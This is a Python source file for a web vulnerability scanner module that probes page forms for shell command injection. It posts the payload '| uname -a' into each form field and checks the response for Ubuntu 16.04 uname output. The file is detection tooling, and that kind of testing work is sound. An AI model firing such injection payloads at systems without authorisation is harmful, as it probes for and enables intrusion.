import httplib2
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, post_request, create_post_params, log_results
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "sci"
EXPLOIT_CLASS = "Command Injection"


class SCIModule:
    """
    Shell Command Injection Module
    Checks for Command Injection vulnerability
    """

    def __init__(self, url, web_pages):
        self.url = url
        self.web_pages = web_pages
        self.logs = {}

    # Check for the string "Ubuntu" and "16.04" in the response - returned by uname -a
    def has_uname_content(self, parsed_response):
        for data_line in parsed_response:
            if "Ubuntu" in data_line and "16.04" in data_line:
                return True
        return False

    def scan(self):
        results = []
        for web_page in self.web_pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            if has_form(response):
                forms = parse_form(response)
                original_response = post_request(web_page, forms)
                injection_forms = []
                for form_input in forms:
                    if form_input[0] == "csrftoken": # We don't have incentive to change this
                        injection_forms.append(form_input)
                    else:
                        injection_forms.append((form_input[0], "| uname -a"))
                new_response = post_request(web_page, injection_forms)
                parsed_response = new_response.splitlines()
                if self.has_uname_content(parsed_response):
                    results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
        self.logs = log_results(self.url, results, EXPLOIT_CLASS)
